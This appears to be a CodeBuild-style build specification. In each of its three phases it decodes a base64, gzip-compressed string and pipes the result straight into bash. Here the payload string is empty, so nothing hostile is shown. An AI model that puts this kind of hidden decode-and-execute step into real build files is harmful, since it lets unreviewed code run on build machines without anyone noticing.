{
  "version": 0.2,
  "env": {
    "shell": "bash"
  },
  "phases": {
    "pre_build": {
      "on-failure": "ABORT",
      "commands": [
        "set -euo pipefail\nprintf '%s' '' | base64 -d | gzip -dc | bash"
      ]
    },
    "build": {
      "on-failure": "ABORT",
      "commands": [
        "set -euo pipefail\nprintf '%s' '' | base64 -d | gzip -dc | bash"
      ]
    },
    "post_build": {
      "on-failure": "ABORT",
      "commands": [
        "set -euo pipefail\nprintf '%s' '' | base64 -d | gzip -dc | bash"
      ]
    }
  }
}
